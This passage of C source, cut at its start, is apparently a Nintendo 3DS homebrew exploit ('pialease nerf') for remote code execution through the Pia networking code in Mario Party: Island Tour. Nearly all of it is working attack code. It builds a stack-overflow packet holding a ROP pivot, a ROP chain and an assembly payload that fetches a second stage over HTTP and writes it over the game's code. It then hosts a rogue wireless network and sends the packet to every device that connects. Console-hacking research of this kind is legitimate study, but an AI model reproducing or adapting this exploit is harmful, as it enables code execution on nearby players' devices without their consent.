	udsUnbind(&bindctx);
	return hadClients;
}

typedef struct __attribute__((packed)) _PiaUdsPacketHeader {
	u8 unk_0;
	u8 cast; // 1 == allow broadcast nodeId, 2 == unicast (broadcast nodeId not allowed). all others are allowed blindly for some reason?
	u8 unk_2;
	u8 piaNodeId; // 0xFF == broadcast.
	u8 cmd; // 5 == vuln-cmd.
	u8 pad_5;
	u16 length;
	u8 pad_8[0xe - 0x8];
	u16 checksum; // crc16 over rest of header. (polynomial = 0xa001)
} PiaUdsPacketHeader;

typedef struct __attribute__((packed)) _PiaUdsVulnPacket { // "UpdateMigrationNodeInfoMessage"
	PiaUdsPacketHeader header;
	u16 newId; // must not be the same as the original one from the client
	u8 count_writes; // not length checked, number of the following arrays that are filed in. even in bounds we can overwrite 0x60 bytes on the stack.
	u8 unk_13; // this+0x1c gets set to this value before hitting the vuln code
	u8 byte_writes[12];
	u8 index_writes[12];
	union {
		u64 qword_writes[2];
		u32 dword_writes[4];
	};
	u32 rop_chain[360];
} PiaUdsVulnPacket;
_Static_assert(sizeof(PiaUdsVulnPacket) == 1500, "wrong size");

static u16 pia_crc16( const void *data, size_t len )
{
	static const uint16_t table[256] = {
		0x0000, 0xC0C1, 0xC181, 0x0140, 0xC301, 0x03C0, 0x0280, 0xC241,
		0xC601, 0x06C0, 0x0780, 0xC741, 0x0500, 0xC5C1, 0xC481, 0x0440,
		0xCC01, 0x0CC0, 0x0D80, 0xCD41, 0x0F00, 0xCFC1, 0xCE81, 0x0E40,
		0x0A00, 0xCAC1, 0xCB81, 0x0B40, 0xC901, 0x09C0, 0x0880, 0xC841,
		0xD801, 0x18C0, 0x1980, 0xD941, 0x1B00, 0xDBC1, 0xDA81, 0x1A40,
		0x1E00, 0xDEC1, 0xDF81, 0x1F40, 0xDD01, 0x1DC0, 0x1C80, 0xDC41,
		0x1400, 0xD4C1, 0xD581, 0x1540, 0xD701, 0x17C0, 0x1680, 0xD641,
		0xD201, 0x12C0, 0x1380, 0xD341, 0x1100, 0xD1C1, 0xD081, 0x1040,
		0xF001, 0x30C0, 0x3180, 0xF141, 0x3300, 0xF3C1, 0xF281, 0x3240,
		0x3600, 0xF6C1, 0xF781, 0x3740, 0xF501, 0x35C0, 0x3480, 0xF441,
		0x3C00, 0xFCC1, 0xFD81, 0x3D40, 0xFF01, 0x3FC0, 0x3E80, 0xFE41,
		0xFA01, 0x3AC0, 0x3B80, 0xFB41, 0x3900, 0xF9C1, 0xF881, 0x3840,
		0x2800, 0xE8C1, 0xE981, 0x2940, 0xEB01, 0x2BC0, 0x2A80, 0xEA41,
		0xEE01, 0x2EC0, 0x2F80, 0xEF41, 0x2D00, 0xEDC1, 0xEC81, 0x2C40,
		0xE401, 0x24C0, 0x2580, 0xE541, 0x2700, 0xE7C1, 0xE681, 0x2640,
		0x2200, 0xE2C1, 0xE381, 0x2340, 0xE101, 0x21C0, 0x2080, 0xE041,
		0xA001, 0x60C0, 0x6180, 0xA141, 0x6300, 0xA3C1, 0xA281, 0x6240,
		0x6600, 0xA6C1, 0xA781, 0x6740, 0xA501, 0x65C0, 0x6480, 0xA441,
		0x6C00, 0xACC1, 0xAD81, 0x6D40, 0xAF01, 0x6FC0, 0x6E80, 0xAE41,
		0xAA01, 0x6AC0, 0x6B80, 0xAB41, 0x6900, 0xA9C1, 0xA881, 0x6840,
		0x7800, 0xB8C1, 0xB981, 0x7940, 0xBB01, 0x7BC0, 0x7A80, 0xBA41,
		0xBE01, 0x7EC0, 0x7F80, 0xBF41, 0x7D00, 0xBDC1, 0xBC81, 0x7C40,
		0xB401, 0x74C0, 0x7580, 0xB541, 0x7700, 0xB7C1, 0xB681, 0x7640,
		0x7200, 0xB2C1, 0xB381, 0x7340, 0xB101, 0x71C0, 0x7080, 0xB041,
		0x5000, 0x90C1, 0x9181, 0x5140, 0x9301, 0x53C0, 0x5280, 0x9241,
		0x9601, 0x56C0, 0x5780, 0x9741, 0x5500, 0x95C1, 0x9481, 0x5440,
		0x9C01, 0x5CC0, 0x5D80, 0x9D41, 0x5F00, 0x9FC1, 0x9E81, 0x5E40,
		0x5A00, 0x9AC1, 0x9B81, 0x5B40, 0x9901, 0x59C0, 0x5880, 0x9841,
		0x8801, 0x48C0, 0x4980, 0x8941, 0x4B00, 0x8BC1, 0x8A81, 0x4A40,
		0x4E00, 0x8EC1, 0x8F81, 0x4F40, 0x8D01, 0x4DC0, 0x4C80, 0x8C41,
		0x4400, 0x84C1, 0x8581, 0x4540, 0x8701, 0x47C0, 0x4680, 0x8641,
		0x8201, 0x42C0, 0x4380, 0x8341, 0x4100, 0x81C1, 0x8081, 0x4040
	};

	u16 crc = 0;
	
	const u8* buf = (const u8*)data;

	if (len == 0) return crc;
	
	if ((len & 1) != 0) {
		crc = table[*buf];
	} else {
		buf--;
	}
	
	size_t words = len / sizeof(u16);
	while (words != 0) {
		u8 vals[sizeof(u16)] = { buf[1], buf[2] };
		buf += sizeof(u16);
		words--;
		u16 temp = table[(u8)crc ^ vals[0]] ^ (crc >> 8);
		crc = table[(u8)temp ^ vals[1]] ^ (temp >> 8);
	}

	return crc;
}

static Result pia_send_impl(const void* buffer, const u16 length, const u8 nodeId, const u8 data_channel, const size_t attempts) {
	Result result;
	for (size_t i = 0; i < attempts; i++) {
		result = udsSendTo(
			nodeId,
			data_channel,
			UDS_SENDFLAG_Default,
			buffer,
			length
		);
		
		if (R_SUCCEEDED(result) || UDS_CHECK_SENDTO_FATALERROR(result)) break;
	}
	
	return result;
}

static u32 g_eur_rop_pivot[] = {
	// We can only copy a few u64s by the exploit.
	// Pivot to the rest of the packet contents also on the stack (enough space for a rop chain and 0x400 byte payload)
	0, // r11
	ROP_EUR_POP_R3PC,
	0xc0,
	ROP_EUR_ADD_SP_SP_R3_POP_PC,
};

// payload adapted from 3ds_smashbroshax, thanks yellows8 :)
// modified to remove SD-loading code (dlp child does not have permissions for that)
// also modified to have codebin-addrs at "end of ROP" before payload so a single payload can be used for all regions
asm (
	".thumb\n"
	"g_payload:\n"
	"mov r7,sp\n" // top of stack contains codebin addrs
	// move the stack pointer elsewhere
	"ldr r0, =" CPP_STRINGIFY(CPP_EVAL(ROP_LINEARMEM_BUF)) "\n"
	"mov sp, r0\n"
	"bl overwrite_framebufs\n"
	// disconnect from the UDS network
	"ldr r6, [r7,#0]\n"
	"blx r6\n"
	// close all UDS resources so we can use httpc
	"ldr r6, [r7,#4]\n"
	"blx r6\n"
	"b 0f\n"
	// ACU_GetWifiStatus()
	"__payload_ACU_GetWifiStatus:\n"
	"push {r0, r1, r4, lr}\n"
	"blx get_cmdbufptr\n"
	"mov r4, r0\n"

	"mov r1, #0xd\n"
	"lsl r1, r1, #16\n"
	"str r1, [r4, #0]\n"

	"ldr r0, [sp, #0]\n"
	"ldr r0, [r0]\n"
	"blx __payload_svcSendSyncRequest\n"
	"cmp r0, #0\n"
	"bne 1f\n"
	"ldr r0, [r4, #4]\n"
	"ldr r2, [sp, #4]\n"
	"ldr r1, [r4, #8]\n"
	"str r1, [r2]\n"

	"1:\n"
	"pop {r1, r2, r4, pc}\n"
	// ACU_WaitInternetConnection
	"0:\n"
	"sub sp, sp, #12\n"

	"add r0, sp, #4\n"
	"add r1, sp, #8\n"
	"ldr r2, =0x753a6361\n"
	"str r2, [r1]\n"
	"mov r2, #4\n"
	"mov r3, #0\n"
	"ldr r4, [r7,#8]\n"
	"blx r4\n"
	"cmp r0, #0\n"
	"bne 1f\n"

	"0:\n"
	"add r0, sp, #4\n"
	"add r1, sp, #8\n"
	"bl __payload_ACU_GetWifiStatus\n"
	"cmp r0, #0\n"
	"bne 0b\n"
	"ldr r0, [sp, #8]\n"
	"cmp r0, #0\n"
	"beq 0b\n"

	"ldr r0, [sp, #4]\n"
	"blx __payload_svcCloseHandle\n"

	"1:\n"
	"add sp, sp, #12\n"
	"b __payload_load\n"
	".pool\n"
	// arm-specific stuff: syscalls + IPC buffer
	".arm\n"
	"__payload_svcCloseHandle:\n"
	"svc 0x23\n"
	"bx lr\n"
	"__payload_svcSendSyncRequest:\n"
	"svc 0x32\n"
	"bx lr\n"
	"__payload_svcSleepThread:\n"
	"svc 0x0a\n"
	"bx lr\n"
	"get_cmdbufptr:\n"
	"mrc 15, 0, r0, cr13, cr0, 3\n"
	"add r0, r0, #0x80\n"
	"bx lr\n"
	".thumb\n"
	// send arbitrary IPC call to http:c
	"__payload_HTTPC_sendcmd:\n"
	"push {r0, r1, r2, r3, r4, lr}\n"
	"blx get_cmdbufptr\n"
	"mov r4, r0\n"

	"ldr r1, [sp, #12]\n"
	"str r1, [r4, #0]\n"
	"ldr r1, [sp, #4]\n"
	"str r1, [r4, #4]\n"
	"ldr r1, [sp, #8]\n"
	"str r1, [r4, #8]\n"

	"ldr r0, [sp, #0]\n"
	"ldr r0, [r0]\n"
	"blx __payload_svcSendSyncRequest\n"
	"cmp r0, #0\n"
	"bne 0f\n"
	"ldr r0, [r4, #4]\n"

	"0:\n"
	"add sp, sp, #16\n"
	"pop {r4, pc}\n"
	".pool\n"
	
	"__payload_HTTPC_Initialize:\n"
	"push {r0, r1, r4, lr}\n"
	"blx get_cmdbufptr\n"
	"mov r4, r0\n"

	"ldr r1, =0x00010044\n"
	"str r1, [r4, #0]\n"
	"ldr r1, =0x1000\n"
	"str r1, [r4, #4]\n"
	"mov r1, #0x20\n"
	"str r1, [r4, #8]\n"
	"mov r1, #0\n"
	"str r1, [r4, #16]\n"
	"str r1, [r4, #20]\n"

	"ldr r0, [sp, #0]\n"
	"ldr r0, [r0]\n"
	"blx __payload_svcSendSyncRequest\n"
	"cmp r0, #0\n"
	"bne 0f\n"
	"ldr r0, [r4, #4]\n"

	"0:\n"
	"pop {r1, r2, r4, pc}\n"
	".pool\n"
	
	"__payload_HTTPC_InitializeConnectionSession:\n"
	"mov r2, #0x20\n"
	"ldr r3, =0x00080042\n"
	"b __payload_HTTPC_sendcmd\n"
	".pool\n"

	"__payload_HTTPC_SetProxyDefault:\n"
	"ldr r3, =0x000e0040\n"
	"b __payload_HTTPC_sendcmd\n"
	".pool\n"

	"__payload_HTTPC_CloseContext:\n"
	"ldr r3, =0x00030040\n"
	"b __payload_HTTPC_sendcmd\n"
	".pool\n"

	"__payload_HTTPC_BeginRequest:\n"
	"ldr r3, =0x00090040\n"
	"b __payload_HTTPC_sendcmd\n"
	".pool\n"
	
	"__payload_HTTPC_CreateContext: @ r0=handle*, r1=ctxhandle*, r2=urlbuf*, r3=urlbufsize\n"
	"push {r0, r1, r2, r3, r4, lr}\n"
	"blx get_cmdbufptr\n"
	"mov r4, r0\n"

	"ldr r1, =0x00020082\n"
	"str r1, [r4, #0]\n"
	"ldr r1, [sp, #12]\n"
	"str r1, [r4, #4]\n"
	"lsl r1, r1, #4\n"
	"mov r2, #0xa\n"
	"orr r1, r1, r2\n"
	"str r1, [r4, #12]\n"
	"ldr r2, [sp, #8]\n"
	"str r2, [r4, #16]\n"
	"mov r3, #1\n"
	"str r3, [r4, #8]\n"

	"ldr r0, [sp, #0]\n"
	"ldr r0, [r0]\n"
	"blx __payload_svcSendSyncRequest\n"
	"cmp r0, #0\n"
	"bne 0f\n"
	"ldr r0, [r4, #4]\n"
	"cmp r0, #0\n"
	"bne 0f\n"
	"ldr r2, [sp, #4]\n"
	"ldr r1, [r4, #8]\n"
	"str r1, [r2]\n"

	"0:\n"
	"add sp, sp, #16\n"
	"pop {r4, pc}\n"
	".pool\n"

	"__payload_HTTPC_ReceiveData: @ r0=handle*, r1=ctxhandle, r2=buf*, r3=bufsize\n"
	"push {r0, r1, r2, r3, r4, lr}\n"
	"blx get_cmdbufptr\n"
	"mov r4, r0\n"

	"ldr r1, =0x000B0082\n"
	"str r1, [r4, #0]\n"
	"ldr r1, [sp, #4]\n"
	"str r1, [r4, #4]\n"
	"ldr r1, [sp, #12]\n"
	"str r1, [r4, #8]\n"
	"lsl r1, r1, #4\n"
	"mov r2, #0xc\n"
	"orr r1, r1, r2\n"
	"str r1, [r4, #12]\n"
	"ldr r2, [sp, #8]\n"
	"str r2, [r4, #16]\n"

	"ldr r0, [sp, #0]\n"
	"ldr r0, [r0]\n"
	"blx __payload_svcSendSyncRequest\n"
	"cmp r0, #0\n"
	"bne 0f\n"
	"ldr r0, [r4, #4]\n"

	"0:\n"
	"add sp, sp, #16\n"
	"pop {r4, pc}\n"
	".pool\n"
	
	"__payload_load:\n"
	"push {lr}\n"
	"sub sp,sp,#28\n"
	
	"ldr r6,=" CPP_STRINGIFY(CPP_EVAL(ROP_LINEARMEM_BUF)) "\n" // this is constant for all architectures, so hardcode it in the payload like so
	
	"add r0, sp, #24\n"
	"add r1, sp, #8\n"
	"ldr r3, =0x70747468\n"
	"str r3, [r1, #0]\n"
	"ldr r3, =0x433a\n"
	"str r3, [r1, #4]\n"
	"mov r2, #6\n"
	"mov r3, #0\n"
	"ldr r4, [r7,#8]\n"
	"blx r4\n"
	"cmp r0, #0\n"
	"bne __payload_load_payload_end\n"

	"add r0, sp, #16\n"
	"add r1, sp, #8\n"
	"mov r2, #6\n"
	"mov r3, #0\n"
	"ldr r4, [r7,#8]\n"
	"blx r4\n"
	"cmp r0, #0\n"
	"bne __payload_load_payload_end\n"

	"mov r4, #0\n"

	"add r0, sp, #24\n"
	"bl __payload_HTTPC_Initialize\n"
	"cmp r0, #0\n"
	"bne __payload_load_payload_endload\n"

	"adr r2, g_payload_end\n"
	// r3 = strlen(r2) + 1
	"mov r3, r2\n"
	"0:\n"
	"ldrb r0, [r3]\n"
	"add r3,r3,#1\n"
	"cmp r0, #0\n"
	"bne 0b\n"
	"sub r3,r3,r2\n"
	
	"add r0, sp, #24\n"
	"add r1, sp, #20\n"
	
	
	"bl __payload_HTTPC_CreateContext\n"
	"cmp r0, #0\n"
	"bne __payload_load_payload_endload\n"

	"add r0, sp, #16\n"
	"ldr r1, [sp, #20]\n"
	"bl __payload_HTTPC_InitializeConnectionSession\n"
	"cmp r0, #0\n"
	"bne __payload_load_payload_endload\n"

	"add r0, sp, #16\n"
	"ldr r1, [sp, #20]\n"
	"bl __payload_HTTPC_BeginRequest\n"
	"cmp r0, #0\n"
	"bne __payload_load_payload_endload\n"

	"add r0, sp, #16\n"
	"ldr r1, [sp, #20]\n"
	"mov r2, r6\n"
	"ldr r3, =0xc000\n"
	"bl __payload_HTTPC_ReceiveData\n"
	"cmp r0, #0\n"
	"bne __payload_load_payload_endload\n"

	"add r0, sp, #16\n"
	"ldr r1, [sp, #20]\n"
	"bl __payload_HTTPC_CloseContext\n"
	"cmp r0, #0\n"
	"bne __payload_load_payload_endload\n"
	"b __payload_load_payload_stage2\n"
	".pool\n"
	
	"__payload_load_payload_stage2:\n"
	"mov r4, #1\n"

	"__payload_load_payload_endload:\n"
	"cmp r4, #2\n"
	"beq __payload_load_payload_end\n"

	"ldr r0, [sp, #24]\n"
	"blx __payload_svcCloseHandle\n"

	"__payload_load_payload_endload_servhandleclose:\n"
	"ldr r0, [sp, #16]\n"
	"blx __payload_svcCloseHandle\n"

	"cmp r4, #0\n"
	"beq __payload_load_payload_end\n"

	"ldr r5, =0x1000\n"
	"ldr r1, =0xc000\n"

	"mov r0, r6\n"
	"ldr r2, [r7, #0xc]\n"
	"blx r2\n"

	"mov r0, r6 @ srcaddr\n"
	"ldr r2, =0x1ff80040\n"
	"ldr r2, [r2]\n"
	"ldr r1, [r7, #0x1c]\n"
	"sub r1, r2, r1\n"
	"lsl r2, r5, #8\n"
	"sub r1, r1, r2 @ Subtract out the .text+0x100000 offset.\n"
	"add r1, r1, r5 @ dstaddr\n"
	"ldr r2, =0xc000 @ size\n"
	"bl cpydat_gxlowcmd4\n"

	"ldr r0, =1000000000\n"
	"mov r1, #0\n"
	"blx __payload_svcSleepThread\n"

	"mov r1, #0\n"
	"mov r2, r1\n"

	"load_payload_memclr:\n"
	"str r2, [r6, r1]\n"
	"add r1, r1, #4\n"
	"cmp r1, r5\n"
	"blt load_payload_memclr\n"

	"ldr r1, [r7, #0x10]\n"
	"str r1, [r6, #0x1c]\n"
	"ldr r1, [r7, #0xc]\n"
	"str r1, [r6, #0x20]\n"
	"mov r1, #0xd @ flags\n"
	"str r1, [r6, #0x48]\n"
	"ldr r1, [r7, #0x14]\n"
	"str r1, [r6, #0x58]\n"

	"mov r0, r6\n"
	"mov r1, sp\n"
	"lsl r2, r5, #8\n"
	"orr r2, r2, r5\n"
	"blx r2\n"

	"__payload_load_payload_end:\n"
	"b __payload_load_payload_end\n"
	".pool\n"

	"overwrite_framebufs:\n"
	"ldr r0, =0x14000000\n"
	"ldr r1, =0x1f000000\n"
	"mov r2, #0x1\n"
	"lsl r2, r2, #20\n"

	"cpydat_gxlowcmd4: @ r0=srcadr, r1=dstadr, r2=size\n"
	"push {r4, r5, lr}\n"
	"sub sp, sp, #32\n"

	"mov r3, #8\n"
	"str r3, [sp, #12] @ flags\n"
	"mov r3, #0 @ width0\n"
	"str r3, [sp, #0]\n"
	"str r3, [sp, #4]\n"
	"str r3, [sp, #8]\n"

	"ldr r5, [r7, #0x10]\n"
	"blx r5\n"

	"add sp, sp, #32\n"
	"pop {r4, r5, pc}\n"
	".pool\n"
	
	".pool\n"
	"g_payload_end:\n"
	".arm\n"
);

extern u8 g_payload[];
extern u8 g_payload_url[];
extern u8 g_payload_end[];

static u32 g_eur_rop_chain[] = {
	// get stack pointer value
	ROP_EUR_MOV_R0SP_MOV_R0R0_ADD_SPSPC8_POP_R4PC,
	0,
	0,
	0, // r4
	
	// put rop-nop in LR
	ROP_EUR_POP_LR_PC,
	ROP_EUR_POP_PC,
	
	// set up memcpy src, length
	ROP_EUR_POP_R1R2R3PC,
	0xdeadbeef, // needs fix up later.
	0x400,
	0,
	ROP_EUR_ADD_R0R0R1_BX_LR,
	ROP_EUR_MOV_R1R0_BX_LR,
	
	// set up memcpy dest
	ROP_EUR_POP_R0PC,
	ROP_LINEARMEM_BUF,
	
	// memcpy to linearmem buf
	ROP_EUR_MEMCPY,
	
	// set up gxlow_flushdatacache args
	ROP_EUR_POP_R0PC,
	ROP_LINEARMEM_BUF, // buffer
	ROP_EUR_POP_R1PC,
	0x400,//ROP_SIZEOF_DMA(g_eur_payload), // length
	
	// flushdatacache
	ROP_EUR_GXLOW_FLUSHDATACACHE,
	
	// get APPMEMALLOC
	ROP_EUR_POP_R1PC,
	0x1FF80040,
	ROP_EUR_LDR_R0R1_POP_R4PC,
	0, // r4
	ROP_EUR_MOV_R1R0_BX_LR,
	
	// set up the constant to subtract to get the linearmem addr of .text+0x10000 in 
	ROP_EUR_POP_R0PC,
	ROP_EUR_CODEBIN_OFFSET - 0x100000 - 0x14000000,
	
	// do the subtract
	ROP_EUR_SUB_R0R1R0_BX_LR,
	
	// set up rest of gxlow_settexturecopy args
	ROP_EUR_POP_R1R2R3PC,
	0, // dest, overwritten later
	0x400,//ROP_SIZEOF_DMA(g_eur_payload), // length
	0, // width0
	
	ROP_EUR_MOV_R1R0_BX_LR, // move dest to right register
	ROP_EUR_POP_R0PC,
	ROP_LINEARMEM_BUF, // src
	
	
	// set up lr so we can go over stack args
	ROP_EUR_POP_LR_PC,
	ROP_EUR_POP_R0R1R2R3R4PC,
	
	// dma over .text!
	ROP_EUR_GXLOW_SETTEXTURECOPY,
	0, // height0 ; after r0
	0, // width0 ; after r1
	0, // height1 ; after r2
	8, // flags ; after r3
	0, // r4
	
	// set up args for svcsleep
	ROP_EUR_POP_R0PC,
	1000000000,
	ROP_EUR_POP_R1PC,
	0,
	// set up lr to return to payload (in thumb mode) after svcsleepthread()
	ROP_EUR_POP_LR_PC,
	0x00100000+0x100000+1,
	
	// svcsleepthread(1 second) to wait for dma
	ROP_EUR_SVC_SLEEPTHREAD,
	// codebin-specific addresses here
	PAYLOAD_EUR_UDS_DISCONNECT,
	PAYLOAD_EUR_UDS_FINALISE,
	PAYLOAD_EUR_SRV_GETSERVICEHANDLE,
	ROP_EUR_GXLOW_FLUSHDATACACHE,
	ROP_EUR_GXLOW_SETTEXTURECOPY,
	PAYLOAD_EUR_HANDLE_GSPGPU,
	ROP_EUR_CODEBIN_OFFSET - 0x100000 - 0x14000000
};

static const char g_otherapp_url[] = "http://example.com";

static bool pia_check_payload_length() {
	PiaUdsVulnPacket* vuln = (PiaUdsVulnPacket*)NULL;
	_Static_assert(sizeof(g_eur_rop_pivot) <= sizeof(vuln->dword_writes), "pivot size incorrect");
	_Static_assert(sizeof(g_eur_rop_chain) <= sizeof(vuln->rop_chain), "chain size incorrect");
	size_t payload_size = (g_payload_end - g_payload);
	if ((sizeof(g_eur_rop_chain) + sizeof(g_otherapp_url) + payload_size) > sizeof(vuln->rop_chain)) {
		printf("bad build, stage1 payload size too long!\n");
		return false;
	}
	return true;
}

static void pia_start_evil_network()
{
	Result ret=0;

	u8 data_channel = 0xf3; // pia hardcodes 0xf3 but games might also use their own
	udsNetworkStruct networkstruct;
	udsBindContext bindctx;
	udsConnectionStatus status;

	const u32 recv_buffer_size = UDS_DEFAULT_RECVBUFSIZE;
	const u32 wlancommID = 0xf8210; // Mario Party: Island Tour (EUR)
	const u8 wlansubID = 1;

	udsNodeInfo tmpnode;
	char tmpstr[256];
	
	PiaUdsVulnPacket evil = {0};
	evil.header.cast = 1;
	evil.header.piaNodeId = 0xff;
	evil.header.cmd = 5;
	evil.header.length = offsetof(PiaUdsVulnPacket, rop_chain) + sizeof(g_eur_rop_chain) + (g_payload_end - g_payload);
	evil.header.checksum = pia_crc16(&evil.header, offsetof(PiaUdsPacketHeader, checksum));
	
	evil.newId = 0x1337;
	// set up the overwrite and the pivot, chain and payload
	size_t payload_size = (g_payload_end - g_payload);
	memcpy(evil.dword_writes, g_eur_rop_pivot, sizeof(g_eur_rop_pivot));
	g_eur_rop_chain[ROP_FIXUP_OFFSET] = sizeof(g_eur_rop_chain) - sizeof(*g_eur_rop_chain);
	memcpy(evil.rop_chain, g_eur_rop_chain, sizeof(g_eur_rop_chain));
	u8* p8_rop = (u8*)evil.rop_chain;
	size_t offset = sizeof(g_eur_rop_chain);
	memcpy(&p8_rop[offset], g_payload, payload_size);
	offset += payload_size;
	memcpy(&p8_rop[offset], g_otherapp_url, sizeof(g_otherapp_url));
	evil.count_writes = sizeof(g_eur_rop_pivot)/sizeof(u64);
	for (int i = 0; i < evil.count_writes; i++) {
		evil.index_writes[i] = (0xb8 / sizeof(u64)) + 1 + i;
	}

	printf("Successfully initialized.\n");
	
	// Fix up the psk for Mario Party: Island Tour. Last char gets removed by the game.
	u8 psk[sizeof(((DlpMainDisconnectRequest*)NULL)->udsPsk)];
	memcpy(psk, g_DlpUds_PSK, sizeof(psk));
	psk[sizeof(psk) - 2] = 0;
	
	{
		udsGenerateDefaultNetworkStruct(&networkstruct, wlancommID, wlansubID, UDS_MAXNODES);

		printf("Creating the network...\n");
		ret = udsCreateNetwork(&networkstruct, psk, sizeof(psk) - 1, &bindctx, data_channel, recv_buffer_size);
		if(R_FAILED(ret))
		{
			printf("udsCreateNetwork() returned 0x%08x.\n", (unsigned int)ret);
			return;
		}
	}
	
	printf("Waiting for connections, press A to stop.\n");

	while(1)
	{
		gspWaitForVBlank();
		hidScanInput();
		u32 kDown = hidKeysDown();

		if(kDown & KEY_A)break;
		
		// Wait for a connection.
		if (!udsWaitConnectionStatusEvent(false, false)) continue;
		
		// Get the current connection status.
		ret = udsGetConnectionStatus(&status);
		if(R_FAILED(ret))
		{
			printf("udsGetConnectionStatus() returned 0x%08x.\n", (unsigned int)ret);
			continue;
		}
		
		// for each updated node : unk_xa = bitmask of nodes that were updated, since last call.
		// node 0 is the host (us), sending a malformed packet there won't really do much :)
		for (int i = 0; i < UDS_MAXNODES; i++) {
			if ((status.unk_xa & (1 << i)) == 0) continue; // not updated
			
			u16* nodeTable = (u16*)&status.unk_xc;
			u16 node = nodeTable[i];
			if (node == status.cur_NetworkNodeID) continue;
			if (node == 0) continue; // 0 means disconnected
			
			ret = udsGetNodeInformation(node, &tmpnode);//This can be used to get the NodeInfo for a node which just connected, for example.
			if(R_FAILED(ret))
			{
				printf("udsGetNodeInformation(%d) returned 0x%08x.\n", node, (unsigned int)ret);
				continue;
			}
			
			// get the username
			memset(tmpstr, 0, sizeof(tmpstr));

			ret = udsGetNodeInfoUsername(&tmpnode, tmpstr);
			if(R_FAILED(ret))
			{
				strcpy(tmpstr, "<unknown>");
			}
			
			printf("Sending haxx to %s...", tmpstr);
			ret = pia_send_impl(&evil, evil.header.length, node, 0xf3, 4);
			if (R_FAILED(ret)) {
				printf("failed:( 0x%08x\n", (unsigned int)ret);
				// try to kick them out
				udsEjectClient(node);
			} else {
				printf("done\n");
				// for debug: kick them out of the network
				udsEjectClient(node);
			}
		}
	}

	udsDestroyNetwork();
	udsUnbind(&bindctx);
}

int main()
{
	Result ret=0;

	gfxInitDefault();
	consoleInit(GFX_TOP, NULL);

	printf("pialease nerf: pia v2.x-3.x remote code execution using dlplay child\n");
	// TODO: region stuff
	u8* cia_ptr = NULL;
	size_t cia_len = 0;
	if (pia_check_payload_length()) {
		FILE* f = fopen("sdmc:/00040001000f8200.cia", "rb");
		if (f == NULL) {
			printf("fopen(sdmc:/00040001000f8200.cia) failed\n");
		} else {
			do {
				int err = fseek(f, 0, SEEK_END);
				if (err != 0) {
					printf("fseek(0, SEEK_END) failed\n");
					break;
				}
				long int file_length = ftell(f);
				if (file_length == -1) {
					printf("ftell() failed\n");
					break;
				}
				err = fseek(f, 0, SEEK_SET);
				if (err != 0) {
					printf("fseek(0, SEEK_SET) failed\n");
					break;
				}
				printf("cia file length is 0x%lx\n", file_length);
				cia_ptr = malloc(file_length);
				if (cia_ptr == NULL) {
					printf("malloc(0x%lx) failed\n", file_length);
					break;
				}
				cia_len = fread(cia_ptr, sizeof(u8), file_length, f);
				if (cia_len != file_length) {
					printf("fread(0x%lx) failed\n", file_length);
					free(cia_ptr);
					break;
				}
			} while (false);
			fclose(f);
		}
	}

	if (cia_ptr != NULL) {
		ret = udsInit(0x3000, "pialznerf");//The sharedmem size only needs to be slightly larger than the total recv_buffer_size for all binds, with page-alignment.
		if(R_FAILED(ret))
		{
			printf("udsInit failed: 0x%08x.\n", (unsigned int)ret);
		}
		else
		{
			if (uds_dlp_run(cia_ptr, cia_len)) {
				pia_start_evil_network();
			}
			udsExit();
		}
	}

	printf("Press START to exit.\n");

	// Main loop
	while (aptMainLoop())
	{
		gspWaitForVBlank();
		hidScanInput();

		u32 kDown = hidKeysDown();
		if (kDown & KEY_START)
			break; // break in order to return to hbmenu

		// Flush and swap framebuffers
		gfxFlushBuffers();
		gfxSwapBuffers();
	}

	gfxExit();
	return 0;
}
